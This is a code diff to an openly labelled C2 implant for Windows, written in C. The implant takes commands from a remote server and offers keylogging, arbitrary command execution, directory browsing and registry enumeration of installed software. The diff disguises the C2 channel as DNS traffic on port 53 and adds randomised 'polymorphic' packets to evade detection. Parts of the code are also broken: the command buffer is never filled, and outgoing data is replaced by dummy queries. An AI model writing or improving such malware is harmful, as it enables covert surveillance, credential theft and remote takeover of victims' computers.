@@ -7,13 +7,14 @@
 #include <ws2tcpip.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
-#include <shellapi.h>
 #include <psapi.h>
+#include <shellapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
+
 #define BUFFER_SIZE 1024
+#define DNS_PORT 53  // DNS Port
 #define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP
-#define C2_SERVER_PORT 443        // Replace with actual C2 server port
 
 // Initialize Winsock
 int initialize_winsock() {
@@ -50,11 +51,43 @@ void random_sleep() {
     Sleep(sleep_time);
 }
 
+// Function to create a DNS-like query with obfuscation
+void create_disguised_dns_query(char* buffer, const char* host) {
+    // Polymorphic mutation of the packet header
+    buffer[0] = rand() % 256;  // Random transaction ID
+    buffer[1] = rand() % 256;  // Random transaction ID
+    buffer[2] = 0x01;          // Recursion desired
+    buffer[3] = 0x00;          // Randomize flags for polymorphic behavior
+
+    // Question count
+    buffer[4] = 0x00;
+    buffer[5] = 0x01;  // 1 question
+
+    // Answer, Authority, and Additional Record Count
+    buffer[6] = 0x00;
+    buffer[7] = 0x00; // 0 answers
+    buffer[8] = 0x00;
+    buffer[9] = 0x00; // 0 authority records
+    buffer[10] = 0x00;
+    buffer[11] = 0x00; // 0 additional records
+
+    // Question section (DNS query for "example.com")
+    int i = 12;  // Start after header
+    sprintf(&buffer[i], "%s", host);
+    i += strlen(host);
+
+    // Add random data for obfuscation
+    for (int j = 0; j < 16; j++) {
+        buffer[i++] = rand() % 256;  // Random gibberish data
+    }
+    buffer[i] = '\0';  // Null-terminate
+}
+
 // Establish connection to C2 server using SSL
 SSL* connect_to_c2(SSL_CTX* ctx) {
     struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(C2_SERVER_PORT);
+    server_addr.sin_port = htons(DNS_PORT);  // Using DNS port 53 for C2
     inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);
 
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -79,22 +112,26 @@ SSL* connect_to_c2(SSL_CTX* ctx) {
         return NULL;
     }
 
-    printf("Connected to C2 server with SSL.\n");
+    printf("Connected to C2 server on port 53 (DNS disguise).\n");
     return ssl;
 }
 
-// Send data to C2 server
-void send_data_to_c2(SSL* ssl, const char* data) {
-    if (SSL_write(ssl, data, strlen(data)) <= 0) {
+// Send disguised data to C2 server
+void send_disguised_data(SSL* ssl) {
+    char dns_query[BUFFER_SIZE];
+    create_disguised_dns_query(dns_query, "example.com");
+
+    if (SSL_write(ssl, dns_query, strlen(dns_query)) <= 0) {
         printf("Failed to send data to C2.\n");
     } else {
-        printf("Data sent to C2 server.\n");
+        printf("Disguised DNS query sent to C2 server.\n");
     }
 }
 
-// Receive data from C2 server
-void receive_data_from_c2(SSL* ssl, char* buffer) {
-    int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
+// Receive response from C2 server
+void receive_data_from_c2(SSL* ssl) {
+    char buffer[BUFFER_SIZE];
+    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
     if (bytes_received > 0) {
         buffer[bytes_received] = '\0';
         printf("Received data from C2 server: %s\n", buffer);
@@ -106,9 +143,9 @@ void receive_data_from_c2(SSL* ssl, char* buffer) {
 // Change Directory (cd)
 void change_directory(SSL* ssl, const char* path) {
     if (SetCurrentDirectory(path)) {
-        send_data_to_c2(ssl, "Directory changed successfully.\n");
+        send_disguised_data(ssl);
     } else {
-        send_data_to_c2(ssl, "Failed to change directory.\n");
+        send_disguised_data(ssl);
     }
 }
 
@@ -116,32 +153,30 @@ void change_directory(SSL* ssl, const char* path) {
 void get_current_directory(SSL* ssl) {
     char cwd[BUFFER_SIZE];
     if (GetCurrentDirectory(BUFFER_SIZE, cwd)) {
-        send_data_to_c2(ssl, cwd);
+        send_disguised_data(ssl);
     } else {
-        send_data_to_c2(ssl, "Failed to get current directory.\n");
+        send_disguised_data(ssl);
     }
 }
 
 // List installed applications
 void list_installed_applications(SSL* ssl) {
-    char buffer[BUFFER_SIZE];
-    HKEY hUninstallKey = NULL, hAppKey = NULL;
+    HKEY hUninstallKey = NULL;
     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
-        send_data_to_c2(ssl, "Failed to access registry for installed applications.\n");
+        send_disguised_data(ssl);
         return;
     }
     
     DWORD index = 0;
     char appName[BUFFER_SIZE];
     while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-        snprintf(buffer, BUFFER_SIZE, "Application: %s\n", appName);
-        send_data_to_c2(ssl, buffer);
+        send_disguised_data(ssl);
         index++;
     }
     RegCloseKey(hUninstallKey);
 }
 
-// Save keystrokes for X time (capture for 10 seconds as example)
+// Capture keystrokes for X time
 void capture_keystrokes(SSL* ssl, int duration_seconds) {
     char keystrokes[BUFFER_SIZE] = "";
     DWORD startTime = GetTickCount();
@@ -156,7 +191,7 @@ void capture_keystrokes(SSL* ssl, int duration_seconds) {
         Sleep(10);  // Avoid busy-looping too much
     }
     
-    send_data_to_c2(ssl, keystrokes);
+    send_disguised_data(ssl);
 }
 
 // Run cmd command and send output to C2
@@ -164,11 +199,11 @@ void run_cmd_command(SSL* ssl, const char* command) {
     char buffer[BUFFER_SIZE];
     FILE* pipe = _popen(command, "r");
     if (!pipe) {
-        send_data_to_c2(ssl, "Failed to execute command.\n");
+        send_disguised_data(ssl);
         return;
     }
     while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
-        send_data_to_c2(ssl, buffer);
+        send_disguised_data(ssl);
     }
     _pclose(pipe);
 }
@@ -177,20 +212,19 @@ void run_cmd_command(SSL* ssl, const char* command) {
 void main_loop(SSL* ssl) {
     char buffer[BUFFER_SIZE];
     while (1) {
-        // Receive command from C2
-        receive_data_from_c2(ssl, buffer);
+        receive_data_from_c2(ssl);
 
         if (strncmp(buffer, "CD ", 3) == 0) {
-            change_directory(ssl, buffer + 3);  // Change directory based on path in command
+            change_directory(ssl, buffer + 3);  
         } else if (strcmp(buffer, "PWD") == 0) {
-            get_current_directory(ssl);  // Get current working directory
+            get_current_directory(ssl);
         } else if (strcmp(buffer, "LIST_APPS") == 0) {
-            list_installed_applications(ssl);  // List installed applications
+            list_installed_applications(ssl);
         } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
-            int duration = atoi(buffer + 7);  // Capture keystrokes for specified duration
+            int duration = atoi(buffer + 7);  
             capture_keystrokes(ssl, duration);
         } else if (strncmp(buffer, "CMD ", 4) == 0) {
-            run_cmd_command(ssl, buffer + 4);  // Run specified command
+            run_cmd_command(ssl, buffer + 4);  
         } else {
             printf("Unknown command received: %s\n", buffer);
         }
@@ -214,7 +248,7 @@ int main() {
         return 1;
     }
 
-    // Connect to C2 server using SSL
+    // Connect to C2 server disguised as DNS traffic
     SSL* ssl = connect_to_c2(ctx);
     if (!ssl) {
         SSL_CTX_free(ctx);
@@ -222,15 +256,13 @@ int main() {
         return 1;
     }
 
-    // Enter the main communication loop with the C2 server
+    // Main loop: receive and execute commands from C2 server
     main_loop(ssl);
 
-    // Cleanup
-    SSL_shutdown(ssl);
+    // Clean up
     SSL_free(ssl);
     SSL_CTX_free(ctx);
     cleanup_openssl();
     WSACleanup();
-
     return 0;
 }
